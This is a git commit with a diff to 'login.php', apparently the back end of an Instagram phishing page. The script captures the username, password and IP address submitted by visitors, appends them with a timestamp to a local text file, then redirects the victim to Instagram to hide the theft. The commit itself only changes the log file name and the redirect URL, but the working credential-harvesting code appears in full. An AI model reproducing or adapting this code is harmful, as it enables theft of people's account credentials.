85da6293ae34ae1d55f4e8b43ed9eb634928550e
aydemir98 <aydemirmm111@gmail.com>
2022-01-15 03:06:06 +0300

    Update login.php

--- login.php
+++ login.php
@@ -7,13 +7,13 @@ $sifre = $_POST['Password'];
 $ip =$_SERVER["REMOTE_ADDR"];
 $tarih = date('d.m.Y - H:i');
 
-$dosya = fopen ("bilgiler.md" , 'a'); 
+$dosya = fopen ("bilgiler.txt" , 'a'); 
 $yaz="Date: ".$tarih."\nUsername:  ". $kullaniciadi . "   Password: " .$sifre."   IP: ".$ip."\n\n";
 fwrite ( $dosya , $yaz ) ;
 fclose ($dosya);
 
 
-header("Location: https://www.instagram.com/accounts/login");
+header("Location: https://www.instagram.com/");
 
 die();
 
